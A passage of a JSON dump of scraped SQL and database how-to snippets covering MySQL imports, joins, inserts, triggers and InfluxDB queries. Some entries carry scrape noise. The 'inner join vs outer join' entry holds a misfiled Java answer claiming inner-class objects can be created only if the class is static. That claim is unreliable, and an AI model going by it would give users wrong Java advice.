    "description": "column::text LIKE '2011-01-%'\n",
    "reg_date": "2021-10-12T09:56:15.000Z"
  },
  {
    "id": 1573,
    "keyword": null,
    "link": null,
    "title": " implicit cursors oracle",
    "description": "  FOR b IN (SELECT *                FROM sometable)   LOOP     <<do something   b.somevalue>>   END LOOP;\n",
    "reg_date": "2021-10-12T09:56:16.000Z"
  },
  {
    "id": 1574,
    "keyword": null,
    "link": null,
    "title": " implode in sql query",
    "description": "$sql = \"SELECT * FROM table WHERE comp_id IN ('\"       . implode(\"','\", array_map('mysql_real_escape_string', $arr))       . \"')\"; \n",
    "reg_date": "2021-10-12T09:56:16.000Z"
  },
  {
    "id": 1575,
    "keyword": null,
    "link": null,
    "title": " import Data in MySQL without using any other software",
    "description": "Convert file in .csv CREATE TABLE (name of the table you insert data in)( columns );  LOAD DATA INFILE \"path\\\\name.csv\" INTO TABLE (name of the table you insert data in) FIELDS TERMINATED BY \"fields terminated by\" LINES TERMINATED BY \"lines terminated by\" IGNORE (how many lines to ignore) LINES (columns)\n",
    "reg_date": "2021-10-12T09:56:16.000Z"
  },
  {
    "id": 1576,
    "keyword": null,
    "link": null,
    "title": " import MySQLdb as Database ModuleNotFoundError: No module named 'MySQLdb'",
    "description": "You can install mysqlclient with pip  If using Python3, try this:  pip3 install mysqlclient  or in Python2  pip install mysqlclient\nsudo apt-get install libmysqlclient-dev sudo apt-get install libssl-dev pip install mysqlclient\nsudo apt-get install -y python3-mysqldb\nconda install -c anaconda mysqlclient \nsudo apt-get install -y python-dev libmysqlclient-dev && sudo pip install mysqlclient \n",
    "reg_date": "2021-10-12T09:56:16.000Z"
  },
  {
    "id": 1577,
    "keyword": null,
    "link": null,
    "title": " import all databases mysql",
    "description": "# Import mysql -u root -p < all.sql\n",
    "reg_date": "2021-10-12T09:56:16.000Z"
  },
  {
    "id": 1578,
    "keyword": null,
    "link": null,
    "title": " import big data to mysql",
    "description": "mysql -u root -D DATA_BASE_NAME < PATH_OF_DATABASE_FILE\n",
    "reg_date": "2021-10-12T09:56:16.000Z"
  },
  {
    "id": 1579,
    "keyword": null,
    "link": null,
    "title": " import database in mysql command line xampp",
    "description": "C:\\xampp\\mysql\\bin>mysql -u {DB_USER} -p {DB_NAME} < path/to/file/ab.sql \n",
    "reg_date": "2021-10-12T09:56:16.000Z"
  },
  {
    "id": 1580,
    "keyword": null,
    "link": null,
    "title": " import database mysql command line",
    "description": "# if your database is not locally hosted mysql -u username -p -h dbhost dbname < filename.sql\nmysql -u username -p database_name < file.sql\nmysql -u username -p database_name < file.sql \nmysql -u username -p new_database < data-dump.sql \n mysql> use db_name;  mysql> source file_name.sql;\nSource : https://www.programmingquest.com/2018/08/how-to-export-mysql-database-using.html open cmd set mysql path in cmd \tset path=c:\\wamp\\bin\\mysql\\mysql5.6.17\\bin For database import (Restore):  \tmysql -u YourUser -p YourDatabaseName < filename.sql\n",
    "reg_date": "2021-10-12T09:56:16.000Z"
  },
  {
    "id": 1581,
    "keyword": null,
    "link": null,
    "title": " import database through command line",
    "description": "mysql -u username -p database_name < file.sql\nmysql -u username -p new_database < data-dump.sql \n mysql> use db_name;  mysql> source file_name.sql;\n",
    "reg_date": "2021-10-12T09:56:16.000Z"
  },
  {
    "id": 1582,
    "keyword": null,
    "link": null,
    "title": " import dump mysql",
    "description": "# if your database is not locally hosted mysql -u username -p -h dbhost dbname < filename.sql\nmysql -u username -p database_name < file.sql\nmysql -u username -p database_name < file.sql \n mysql> use db_name;  mysql> source file_name.sql;\nSource : https://www.programmingquest.com/2018/08/how-to-export-mysql-database-using.html open cmd set mysql path in cmd \tset path=c:\\wamp\\bin\\mysql\\mysql5.6.17\\bin For database import (Restore):  \tmysql -u YourUser -p YourDatabaseName < filename.sql\nmysql> use db_name; mysql> source backup-file.sql; \n",
    "reg_date": "2021-10-12T09:56:16.000Z"
  },
  {
    "id": 1583,
    "keyword": null,
    "link": null,
    "title": " import excel csv into mysql with python",
    "description": "# Insert DataFrame to Table for row in df.itertuples():     cursor.execute('''                 INSERT INTO TestDB.dbo.people_info (Name, Country, Age)                 VALUES (?,?,?)                 ''',                 row.Name,                  row.Country,                 row.Age                 ) conn.commit()\nimport pandas as pd import pyodbc  # Import CSV data = pd.read_csv (r'C:\\Users\\Ron\\Desktop\\Test\\People.csv')    df = pd.DataFrame(data, columns= ['Name','Country','Age'])  # Connect to SQL Server conn = pyodbc.connect('Driver={SQL Server};'                       'Server=RON\\SQLEXPRESS;'                       'Database=TestDB;'                       'Trusted_Connection=yes;') cursor = conn.cursor()  # Create Table cursor.execute('CREATE TABLE people_info (Name nvarchar(50), Country nvarchar(50), Age int)')  # Insert DataFrame to Table for row in df.itertuples():     cursor.execute('''                 INSERT INTO TestDB.dbo.people_info (Name, Country, Age)                 VALUES (?,?,?)                 ''',                 row.Name,                  row.Country,                 row.Age                 ) conn.commit() \n",
    "reg_date": "2021-10-12T09:56:16.000Z"
  },
  {
    "id": 1584,
    "keyword": null,
    "link": null,
    "title": " import excel to sql",
    "description": "You can also use OPENROWSET to import excel file in sql server.  SELECT * INTO Your_Table FROM OPENROWSET('Microsoft.ACE.OLEDB.12.0',                         'Excel 12.0;Database=C:\\temp\\MySpreadsheet.xlsx',                         'SELECT * FROM [Data$]')\n",
    "reg_date": "2021-10-12T09:56:17.000Z"
  },
  {
    "id": 1585,
    "keyword": null,
    "link": null,
    "title": " import file mysql terminal",
    "description": "mysql -u<username> -p<password> databaseName < /path/fileName.sql \nmysql -u username -p new_database < data-dump.sql \nmysql -u<user_name> -puser_password> <database_name> source /path/db.sql\n",
    "reg_date": "2021-10-12T09:56:17.000Z"
  },
  {
    "id": 1586,
    "keyword": null,
    "link": null,
    "title": " import large .sql files into lampp",
    "description": "->/opt/lampp/etc/php.ini 1)increase them accordingly   post_max_size=500M upload_max_filesize=500M max_input_time = 600 memory_limit=900M max_execution_time=-1  ->in opt/lampp/etc/my.cnf max_allowed_packet=1000 innodb_log_file_size = 50M  ->phpMyAdmin\\libraries\\config.default.php $cfg['ExecTimeLimit'] = 0; ______________________________________________ 2nd method   goto lampp/phpmyadmin create two folders in the same directory namely save and upload   goto lampp/phpmyadmin/config.inc.php $cfg['UploadDir'] = '/opt/lampp/phpmyadmin/upload'; $cfg['SaveDir'] = '/opt/lampp/phpmyadmin/save';  save  and then put the large .SQL file into the upload folder  it will come under the import page automatically \n",
    "reg_date": "2021-10-12T09:56:17.000Z"
  },
  {
    "id": 1587,
    "keyword": null,
    "link": null,
    "title": " import local sql into remote mysql",
    "description": "mysql -h host -u user_name -p password database_name < file.sql\n",
    "reg_date": "2021-10-12T09:56:17.000Z"
  },
  {
    "id": 1588,
    "keyword": null,
    "link": null,
    "title": " import mysql command line without database",
    "description": "mysql -u username -p new_database < data-dump.sql \nmysql -u username -p database_name < file.sql  Note-1: It is better to use the full path of the SQL file file.sql. Note-2: Use -R and --triggers to keep the routines and triggers of original database. \t\tThey are not copied by default. Note-3 You may have to create the (empty) database from mysql if it  \t\tdoesn't exist already and the exported SQL don't          contain CREATE DATABASE (exported with --no-create-db or -n option),          before you can import it.\n",
    "reg_date": "2021-10-12T09:56:17.000Z"
  },
  {
    "id": 1589,
    "keyword": null,
    "link": null,
    "title": " import mysql database command line",
    "description": "# if your database is not locally hosted mysql -u username -p -h dbhost dbname < filename.sql\nmysql -u username -p database_name < file.sql\nmysql -u username -p database_name < file.sql \nmysql -u username -p new_database < data-dump.sql \n mysql> use db_name;  mysql> source file_name.sql;\nSource : https://www.programmingquest.com/2018/08/how-to-export-mysql-database-using.html open cmd set mysql path in cmd \tset path=c:\\wamp\\bin\\mysql\\mysql5.6.17\\bin For database import (Restore):  \tmysql -u YourUser -p YourDatabaseName < filename.sql\n",
    "reg_date": "2021-10-12T09:56:17.000Z"
  },
  {
    "id": 1590,
    "keyword": null,
    "link": null,
    "title": " import mysql database command line linux",
    "description": "mysql -u<user_name> -puser_password> <database_name> source /path/db.sql\nSource : https://www.programmingquest.com/2018/08/how-to-export-mysql-database-using.html open cmd set mysql path in cmd \tset path=c:\\wamp\\bin\\mysql\\mysql5.6.17\\bin For database import (Restore):  \tmysql -u YourUser -p YourDatabaseName < filename.sql\n",
    "reg_date": "2021-10-12T09:56:17.000Z"
  },
  {
    "id": 1591,
    "keyword": null,
    "link": null,
    "title": " import mysql dump command line",
    "description": "# if your database is not locally hosted mysql -u username -p -h dbhost dbname < filename.sql\nmysql -u username -p database_name < file.sql \nmysqldump -u username -p dbname > filename.sql\nmysql -u username -p database_name < file.sql  Note-1: It is better to use the full path of the SQL file file.sql. Note-2: Use -R and --triggers to keep the routines and triggers of original database. \t\tThey are not copied by default. Note-3 You may have to create the (empty) database from mysql if it  \t\tdoesn't exist already and the exported SQL don't          contain CREATE DATABASE (exported with --no-create-db or -n option),          before you can import it.\nmysql -u username -p dbname < filename.sql\nmysql> use db_name; mysql> source backup-file.sql; \n",
    "reg_date": "2021-10-12T09:56:17.000Z"
  },
  {
    "id": 1592,
    "keyword": null,
    "link": null,
    "title": " import mysql dump command line windows",
    "description": "mysql -u username -p database_name < file.sql\nmysql -u username -p database_name < file.sql \nmysql> use db_name; mysql> source backup-file.sql; \nC:\\wamp\\bin\\mysql\\mysql5.0.51b\\bin>mysql -u root -p YourDatabaseName < YourFileName.sql\n",
    "reg_date": "2021-10-12T09:56:17.000Z"
  },
  {
    "id": 1593,
    "keyword": null,
    "link": null,
    "title": " import mysql dump database command line linux",
    "description": "mysql -u<user_name> -puser_password> <database_name> source /path/db.sql\n",
    "reg_date": "2021-10-12T09:56:17.000Z"
  },
  {
    "id": 1594,
    "keyword": null,
    "link": null,
    "title": " import sql file cli",
    "description": "mysql> use db_name;  mysql> SET autocommit=0 ; source the_sql_file.sql ; COMMIT ; \n",
    "reg_date": "2021-10-12T09:56:18.000Z"
  },
  {
    "id": 1595,
    "keyword": null,
    "link": null,
    "title": " import sql file from laravel",
    "description": "use Illuminate\\Support\\Facades\\DB;  DB::unprepared(file_get_contents('PATH_TO_SQL'));\n",
    "reg_date": "2021-10-12T09:56:18.000Z"
  },
  {
    "id": 1596,
    "keyword": null,
    "link": null,
    "title": " import sql file mysql commadn line",
    "description": "mysql -u username -p database_name < file.sql \n",
    "reg_date": "2021-10-12T09:56:18.000Z"
  },
  {
    "id": 1597,
    "keyword": null,
    "link": null,
    "title": " import sql from terminal",
    "description": "mysql -u <username> -p <databasename> < <filename.sql> \nmysql> use db_name;  mysql> SET autocommit=0 ; source the_sql_file.sql ; COMMIT ; \n",
    "reg_date": "2021-10-12T09:56:18.000Z"
  },
  {
    "id": 1598,
    "keyword": null,
    "link": null,
    "title": " import sql mysql ubuntu",
    "description": "mysql -u username -p database_name < file.sql #or, after login in to mysql source sql_file_name_with_path.sql;\n",
    "reg_date": "2021-10-12T09:56:18.000Z"
  },
  {
    "id": 1599,
    "keyword": null,
    "link": null,
    "title": " import sql via command line",
    "description": "mysql -u <username> -p <databasename> < <filename.sql> \nmysql> use db_name;  mysql> SET autocommit=0 ; source the_sql_file.sql ; COMMIT ; \nuse DATABASE_NAME source SQL_FILE_PATH   e.g. use test source c://users.sql\n",
    "reg_date": "2021-10-12T09:56:18.000Z"
  },
  {
    "id": 1600,
    "keyword": null,
    "link": null,
    "title": " importance of comment in mysql",
    "description": "3- types of comments:   #: single line comment put at the end of line.   --: single line comment put at the end of line.   /* */: multiline  comment put at anywhere in code.   \n",
    "reg_date": "2021-10-12T09:56:18.000Z"
  },
  {
    "id": 1601,
    "keyword": null,
    "link": null,
    "title": " importar una base de datos mysql",
    "description": "mysql -u usuario -p nombre_basededatos < data.sql\n",
    "reg_date": "2021-10-12T09:56:18.000Z"
  },
  {
    "id": 1602,
    "keyword": null,
    "link": null,
    "title": " importerror no module named mysql.connector raspberry pi",
    "description": "sudo pip install mysql-connector-python\n",
    "reg_date": "2021-10-12T09:56:19.000Z"
  },
  {
    "id": 1603,
    "keyword": null,
    "link": null,
    "title": " in in sql",
    "description": "Used alongside a WHERE clause as a shorthand for multiple OR conditions. So instead of: SELECT * FROM users WHERE country = 'USA' OR country = 'United Kingdom' OR country = 'Russia' OR country = 'Australia'; You can use: SELECT * FROM users WHERE country IN ('USA', 'United Kingdom', 'Russia', 'Australia');\n (IN) operator in sql like \"OR\" operator For example:  Select * From employees Where department_id \"IN\" (60,90);  \nSQL NOT IN operator is used to filter the result if the values that are mentioned as part of the IN operator is not satisfied. Let&rsquo;s discuss in detail about SQL NOT IN operator.  Syntax: SELECT Column(s) FROM table_name WHERE Column NOT IN (value1, value2... valueN);\nSELECT Id, FirstName, LastName, Country  FROM Customer WHERE Country IN        (SELECT Country           FROM Supplier) \n(IN) operator in sql like \"OR\" operator For example:  Select * From employees Where department_id \"IN\" (60,90);  \nSELECT FullName FROM EmployeeDetails WHERE FullName LIKE &lsquo;__hn%&rsquo;; \n",
    "reg_date": "2021-10-12T09:56:19.000Z"
  },
  {
    "id": 1604,
    "keyword": null,
    "link": null,
    "title": " in memory sqllite",
    "description": "using System; using System.Data.SQLite;  string cs = @\"URI=file:C:\\Users\\Jano\\Documents\\test.db\";  using var con = new SQLiteConnection(cs); con.Open();  using var cmd = new SQLiteCommand(con);  cmd.CommandText = \"DROP TABLE IF EXISTS cars\"; cmd.ExecuteNonQuery();  cmd.CommandText = @\"CREATE TABLE cars(id INTEGER PRIMARY KEY,             name TEXT, price INT)\"; cmd.ExecuteNonQuery();  cmd.CommandText = \"INSERT INTO cars(name, price) VALUES('Audi',52642)\"; cmd.ExecuteNonQuery();  cmd.CommandText = \"INSERT INTO cars(name, price) VALUES('Mercedes',57127)\"; cmd.ExecuteNonQuery();  cmd.CommandText = \"INSERT INTO cars(name, price) VALUES('Skoda',9000)\"; cmd.ExecuteNonQuery();  cmd.CommandText = \"INSERT INTO cars(name, price) VALUES('Volvo',29000)\"; cmd.ExecuteNonQuery();  cmd.CommandText = \"INSERT INTO cars(name, price) VALUES('Bentley',350000)\"; cmd.ExecuteNonQuery();  cmd.CommandText = \"INSERT INTO cars(name, price) VALUES('Citroen',21000)\"; cmd.ExecuteNonQuery();  cmd.CommandText = \"INSERT INTO cars(name, price) VALUES('Hummer',41400)\"; cmd.ExecuteNonQuery();  cmd.CommandText = \"INSERT INTO cars(name, price) VALUES('Volkswagen',21600)\"; cmd.ExecuteNonQuery();  Console.WriteLine(\"Table cars created\"); \nusing System; using System.Data.SQLite;  string cs = \"Data Source=:memory:\"; string stm = \"SELECT SQLITE_VERSION()\";  using var con = new SQLiteConnection(cs); con.Open();  using var cmd = new SQLiteCommand(stm, con); string version = cmd.ExecuteScalar().ToString();  Console.WriteLine($\"SQLite version: {version}\"); \n",
    "reg_date": "2021-10-12T09:56:19.000Z"
  },
  {
    "id": 1605,
    "keyword": null,
    "link": null,
    "title": " incompatible sql mode=only full group by",
    "description": "mysql > SET GLOBAL sql_mode=(SELECT REPLACE(@@sql_mode,'ONLY_FULL_GROUP_BY','')); \n",
    "reg_date": "2021-10-12T09:56:19.000Z"
  },
  {
    "id": 1606,
    "keyword": null,
    "link": null,
    "title": " increase speed of like queries postgres",
    "description": "CREATE INDEX tbl_col_gin_trgm_idx  ON tbl USING gin  (col gin_trgm_ops);\n",
    "reg_date": "2021-10-12T09:56:19.000Z"
  },
  {
    "id": 1607,
    "keyword": null,
    "link": null,
    "title": " increasing font and zooming in mysql workbench",
    "description": "MACOS At the bottom of the editor, do you see the drop down labeled \"100%\". Try that to change the font size.  Others  You can change the font, going to Edit > Preferences... > Appearance > Fonts section Afterwards restart mysql workbench to finally change the zoom state\n",
    "reg_date": "2021-10-12T09:56:19.000Z"
  },
  {
    "id": 1608,
    "keyword": null,
    "link": null,
    "title": " increment integer in table sql",
    "description": "UPDATE myTable SET ID = ID + 1 \n",
    "reg_date": "2021-10-12T09:56:19.000Z"
  },
  {
    "id": 1609,
    "keyword": null,
    "link": null,
    "title": " index in mysql",
    "description": "create index your_index_name on your_table_name(your_column_name) using HASH; or create index your_index_name on your_table_name(your_column_name) using BTREE;\nEx. Explain select * from user where name = &lsquo;kinjal&rsquo;\t#here explain is used for finding that how much time it takes to find name, how much rows in search. \nIndexes are used to find rows with specific column values quickly. Without an index, MySQL must begin with the first row and then read through the entire table to find the relevant rows. The larger the table, the more this costs.\n   SELECT * FROM table1 USE INDEX (col1_index,col2_index)     WHERE col1=1 AND col2=2 AND col3=3;\n",
    "reg_date": "2021-10-12T09:56:19.000Z"
  },
  {
    "id": 1610,
    "keyword": null,
    "link": null,
    "title": " influxdb delete measurement based on date",
    "description": "# InfluxDB: delete from measurement, based on time DELETE FROM foo WHERE time > '2014-06-30' and time < '2014-06-30 15:16:01'\n",
    "reg_date": "2021-10-12T09:56:19.000Z"
  },
  {
    "id": 1611,
    "keyword": null,
    "link": null,
    "title": " influxdb export to csv",
    "description": "influx -database 'database_name' -execute 'SELECT * FROM table_name' -format csv > test.csv\n",
    "reg_date": "2021-10-12T09:56:20.000Z"
  },
  {
    "id": 1612,
    "keyword": null,
    "link": null,
    "title": " influxdb list all tags for a measurement",
    "description": "SHOW FIELD KEYS [ON <database_name>] [FROM <measurement_name>] # option a) \tSHOW FIELD KEYS ON MyDatebase FROM MyMesurement # option b) \tuse MyDatebase \tSHOW FIELD KEYS FROM MyMesurement\n",
    "reg_date": "2021-10-12T09:56:20.000Z"
  },
  {
    "id": 1613,
    "keyword": null,
    "link": null,
    "title": " initialized foreign key in sql",
    "description": "CREATE TABLE Orders ( OrderID int NOT NULL, OrderNumber int NOT NULL, PersonID int,     PRIMARY KEY (OrderID),    FOREIGN KEY (PersonID) REFERENCES Persons(PersonID)  ); \n",
    "reg_date": "2021-10-12T09:56:20.000Z"
  },
  {
    "id": 1614,
    "keyword": null,
    "link": null,
    "title": " inner join",
    "description": "SELECT column_name(s) FROM table1 INNER JOIN table2 ON table1.column_name = table2.column_name;\nINNER JOIN is used when retrieving data from multiple tables and will return only matching data.  example= Select P.FIRST_NAME , M.DRUG_ID FROM PATIENTS P INNER JOIN MEDICATIONS M ON P.PATIENTS_ID = M.PATIENTS_ID\n-- Rows with ID existing in both a, b and c -- JOIN is equivalent to INNER JOIN SELECT a.ID, a.NAME, b.VALUE1, c.VALUE1 FROM table1 a    JOIN table2 b ON a.ID = b.ID   JOIN table3 c ON a.ID = c.ID WHERE a.ID >= 1000; -- &dArr; Test it &dArr; (Fiddle source link)\n1234567SELECT columns  FROM table_A  INNER JOIN table_B     ON join_conditions1 AND join_conditions2  INNER JOIN table_C    ON join_conditions3 OR join_conditions4...XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX\n123SELECT columns  FROM table_A  INNER JOIN table_B ON join_conditionsXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX\nSELECT character.name, inventory.id FROM charactercreator_character AS character, charactercreator_character_inventory AS inventory WHERE character.character_id = inventory.character_id;\n",
    "reg_date": "2021-10-12T09:56:20.000Z"
  },
  {
    "id": 1615,
    "keyword": null,
    "link": null,
    "title": " inner join mysql",
    "description": "SELECT column_name(s) FROM table1 INNER JOIN table2 ON table1.column_name = table2.column_name;\n-- Rows with ID existing in both a and b -- JOIN is equivalent to INNER JOIN SELECT a.ID, a.NAME, b.VALUE1 FROM table1 a    JOIN table2 b ON a.ID = b.ID WHERE a.ID >= 1000; -- &dArr; Test it &dArr; (Fiddle source link)\nA relational database consists of multiple related tables linking together using common columns which are known as foreign key columns. Because of this, data in each table is incomplete from the business perspective. MySQL supports the following types of joins:  Inner join Left join Right join Cross join  The following shows the basic syntax of the inner join clause that joins two tables table_1 and table_2:  SELECT column_list FROM table_1 INNER JOIN table_2 ON join_condition;   SELECT column_list FROM table_1 INNER JOIN table_2 USING (column_name);  SELECT column_list  FROM table_1  LEFT JOIN table_2 USING (column_name); Here is the syntax of the right join:  SELECT column_list  FROM table_1  RIGHT JOIN table_2 ON join_condition;  The following shows the basic syntax of the cross join clause:  SELECT select_list FROM table_1 CROSS JOIN table_2;\n",
    "reg_date": "2021-10-12T09:56:20.000Z"
  },
  {
    "id": 1616,
    "keyword": null,
    "link": null,
    "title": " inner join update",
    "description": "UPDATE tb1 SET tb1.column_1 = tb2.column_1 FROM table_1 AS tb1 INNER JOIN table_2 AS tb2 ON tb1.column_2 = tb2.column_3\nUPDATE      t1 SET      t1.c1 = t2.c2,     t1.c2 = expression,     ...    FROM      t1     [INNER | LEFT] JOIN t2 ON join_predicate WHERE      where_predicate; \n",
    "reg_date": "2021-10-12T09:56:20.000Z"
  },
  {
    "id": 1617,
    "keyword": null,
    "link": null,
    "title": " inner join vs outer join",
    "description": "1. Can Outer class be static? --> No 2. Can inner class be static? --> Yes 3. Can you create an object from the inner class? --> Only if it's static 4. Can we have main method in inner class ? --> Only if it's static 5. Inner class can only be extended if it's static.\n-- Rows with ID existing in both a and b -- JOIN is equivalent to INNER JOIN SELECT a.ID, a.NAME, b.VALUE1 FROM table1 a    JOIN table2 b ON a.ID = b.ID WHERE a.ID >= 1000; -- &dArr; Test it &dArr; (Fiddle source link)\nINNER JOIN: is used when retrieving data from multiple tables and will return only matching data.   FULL OUTER JOIN: is used when retrieving data from multiple tables and will return both table records, matching and non-matching.\nINNER JOIN: is used when retrieving data from multiple tables and will return only matching data.  LEFT OUTER JOIN: is used when retrieving data from multiple tables and will return left table and any matching right table records.  RIGHT OUTER JOIN: is used when retrieving data from multiple tables and will return right table and any matching left table records  FULL OUTER JOIN: is used when retrieving data from multiple tables and will return both table records, matching and non-matching.\n",
    "reg_date": "2021-10-12T09:56:20.000Z"
  },
  {
    "id": 1618,
    "keyword": null,
    "link": null,
    "title": " input in mysql",
    "description": "-- Example for MysQL: SET @my_Id:=30; SELECT * FROM my_table WHERE id=@my_Id;  -- Example in Oracle: SELECT * FROM my_table WHERE id = :my_id;\n",
    "reg_date": "2021-10-12T09:56:20.000Z"
  },
  {
    "id": 1619,
    "keyword": null,
    "link": null,
    "title": " insensitive case match sqlalchemy",
    "description": "from sqlalchemy import func user = models.User.query.filter(func.lower(User.username) == func.lower(\"GaNyE\")).first()\n",
    "reg_date": "2021-10-12T09:56:20.000Z"
  },
  {
    "id": 1620,
    "keyword": null,
    "link": null,
    "title": " inser into example",
    "description": "-- How to insert into MySQL table new values INSERT INTO table_name (column1, column2, column3, ...) VALUES (value1, value2, value3, ...);\n",
    "reg_date": "2021-10-12T09:56:20.000Z"
  },
  {
    "id": 1621,
    "keyword": null,
    "link": null,
    "title": " insert a select statement into a table",
    "description": "--format INSERT INTO Customers (CustomerName, City, Country) SELECT SupplierName, City, Country FROM Suppliers;  --examples INSERT INTO Customers (CustomerName, City, Country) SELECT SupplierName, City, Country FROM Suppliers;\n",
    "reg_date": "2021-10-12T09:56:21.000Z"
  },
  {
    "id": 1622,
    "keyword": null,
    "link": null,
    "title": " insert after update trigger",
    "description": "-- SQL Server (update my_table after update on my_table) CREATE TRIGGER trigger_name ON my_table AFTER UPDATE AS IF UPDATE (col_name)\t-- Optional, for particular column BEGIN     UPDATE my_table SET my_col_date = getdate() FROM my_table  END; -- Oracle (insert into log table after update on my_table) CREATE OR REPLACE TRIGGER trigger_name AFTER UPDATE ON my_table FOR EACH ROW BEGIN     INSERT INTO my_log_table (LOG_DATE, ACTION) VALUES (SYSDATE, 'Changed'); END;\n",
    "reg_date": "2021-10-12T09:56:21.000Z"
  },
  {
    "id": 1623,
    "keyword": null,
    "link": null,
    "title": " insert array into mysql column",
    "description": "//Do db insert  $arr = array('val1','val2'); $string = implode(',',$arr);   //Do db retrieve  $arr = explode(',',$string); \n",
    "reg_date": "2021-10-12T09:56:21.000Z"
  },
  {
    "id": 1624,
    "keyword": null,
    "link": null,
    "title": " insert column after column mysql",
    "description": "ALTER TABLE tbl_name ADD COLUMN new_column_name VARCHAR(15) AFTER existing_column_name;\n",
    "reg_date": "2021-10-12T09:56:21.000Z"
  },
  {
    "id": 1625,
    "keyword": null,
    "link": null,
    "title": " insert current date in mysql",
    "description": "UPDATE personal set birthday = STR_TO_DATE('1-01-2012', '%d-%m-%Y') where birthday IS NULL;\nINSERT INTO my_table (last_updated) VALUES(NOW()); INSERT INTO my_table (last_updated) VALUES(sysdate);\t-- Oracle INSERT INTO my_table (last_updated) VALUES(getdate());\t-- SQL Server\nNOW()\n",
    "reg_date": "2021-10-12T09:56:21.000Z"
  },
  {
    "id": 1626,
    "keyword": null,
    "link": null,
    "title": " insert current date sql",
    "description": "INSERT INTO FOO (xpto) VALUES(TO_DATE('17/12/2015', 'DD/MM/YYYY'));\nINSERT INTO my_table (last_updated) VALUES(NOW()); INSERT INTO my_table (last_updated) VALUES(sysdate);\t-- Oracle INSERT INTO my_table (last_updated) VALUES(getdate());\t-- SQL Server\n",
    "reg_date": "2021-10-12T09:56:21.000Z"
  },
  {
    "id": 1627,
    "keyword": null,
    "link": null,
    "title": " insert date sql",
    "description": "INSERT INTO FOO (xpto) VALUES(TO_DATE('17/12/2015', 'DD/MM/YYYY'));\nINSERT INTO my_table (last_updated) VALUES(NOW()); INSERT INTO my_table (last_updated) VALUES(sysdate);\t-- Oracle INSERT INTO my_table (last_updated) VALUES(getdate());\t-- SQL Server\n",
    "reg_date": "2021-10-12T09:56:21.000Z"
  },
  {
    "id": 1628,
    "keyword": null,
    "link": null,
    "title": " insert in to table sql",
    "description": "It is possible to write the INSERT INTO statement in two ways:  1. Specify both the column names and the values to be inserted: INSERT INTO table_name (column1, column2, column3, ...) VALUES (value1, value2, value3, ...);  2. If you are adding values for all the columns of the table, you do not need to specify the column names in the SQL query. However, make sure the order of the values is in the same order as the columns in the table. Here, the INSERT INTO syntax would be as follows: INSERT INTO table_name VALUES (value1, value2, value3, ...); \n",
    "reg_date": "2021-10-12T09:56:21.000Z"
  },
  {
    "id": 1629,
    "keyword": null,
    "link": null,
    "title": " insert into",
    "description": "--sql insert quest example INSERT INTO table_name (column1, column2, column3, ...) VALUES (value1, value2, value3, ...); \n-- Note: This is specifically for SQL - Oracle -- --------------------------------------------------------------- -- OPTION 1: Insert specific values (other values will be null)  -- syntax  INSERT INTO <TABLE_NAME> (<column1>,<column2>,<column3>,...)  VALUES (<value1>,<value2>,<value3>,...);  -- example INSERT INTO SALES (SALE_ID,ITEM_ID,QUANTITY,AMOUNT) VALUES (631,13,4,59.99); -- --------------------------------------------------------------- -- OPTION 2: Insert a value for every field  -- syntax INSERT INTO <TABLE_NAME> VALUES (<value1>,<value2>,...,<valueN>);  -- example (SALES table only consists of 4 columns) INSERT INTO SALES VALUES (631,13,4,59.99); -- ---------------------------------------------------------------\nINSERT INTO client (prenom, nom, ville, age)  VALUES  ('R&eacute;becca', 'Armand', 'Saint-Didier-des-Bois', 24),  ('Aim&eacute;e', 'Hebert', 'Marigny-le-Ch&acirc;tel', 36),  ('Marielle', 'Ribeiro', 'Maill&egrave;res', 27),  ('Hilaire', 'Savary', 'Conie-Molitard', 58);\nINSERT INTO table_name (a, b) VALUES (val1, val2);  INSERT INTO table_name (a, b) VALUES (val1, val2), (val3, val4); -- 2 rows  -- From a query: INSERT INTO table_name (a, b)  \tSELECT val1 AS a, val2 AS b      FROM source_table s \tWHERE s.val1 >= 10;\n/*No List parameters */ INSERT INTO table_name  VALUES (value1, value2, value3, ...); \n INSERT INTO Customers (CustomerName, City, Country)  VALUES ('Cardinal', 'Stavanger', 'Norway');  \n",
    "reg_date": "2021-10-12T09:56:21.000Z"
  },
  {
    "id": 1630,
    "keyword": null,
    "link": null,
    "title": " insert into auto increment mysql",
    "description": "ALTER TABLE users AUTO_INCREMENT=1001;\nALTER TABLE User AUTO_INCREMENT = 1;\n/* To insert into an auto incrementing field without specifing every column in the table, you can use the key word default in the place of the auto  incrementing column*/  INSERT INTO my_table VALUES(default, \"test1\", 222) /*VS */ INSERT INTO my_table(name, num) VALUES(\"test1\", 222) /*Having to type out all of the column names except the auto incrementing one can be very tedious when you have many columns, just use the keyword defualt instead and you only have to type it once.\n",
    "reg_date": "2021-10-12T09:56:21.000Z"
  },
  {
    "id": 1631,
    "keyword": null,
    "link": null,
    "title": " insert into mysql subquery",
    "description": "INSERT INTO qa_costpriceslog (item_code, invoice_code, item_costprice)   SELECT     /* Literal number values with column aliases */     1 AS item_code,     2 AS invoice_code,     item_costprice   FROM qa_items    WHERE item_code = 1; \n",
    "reg_date": "2021-10-12T09:56:22.000Z"
  },
  {
    "id": 1632,
    "keyword": null,
    "link": null,
    "title": " insert into oracle",
    "description": "INSERT INTO table (column1, column2, ... column_n ) VALUES (expression1, expression2, ... expression_n );\nINSERT INTO table_name (a, b) VALUES (val1, val2);  INSERT INTO table_name (a, b) VALUES (val1, val2), (val3, val4); -- 2 rows  -- From a query: INSERT INTO table_name (a, b)  \tSELECT val1 AS a, val2 AS b      FROM source_table s \tWHERE s.val1 >= 10;\nINSERT INTO my_table SELECT * FROM source_table; INSERT INTO my_table (a, b, c) SELECT a, b, c FROM source_table; INSERT INTO my_table (a, b, c) SELECT a, b, c FROM source_table s \tWHERE s.my_col >= 10;\nINSERT INTO table (column1, column2, ... column_n ) SELECT expression1, expression2, ... expression_n FROM source_table [WHERE conditions];\n",
    "reg_date": "2021-10-12T09:56:22.000Z"
  },
  {
    "id": 1633,
    "keyword": null,
    "link": null,
    "title": " insert into select oracle",
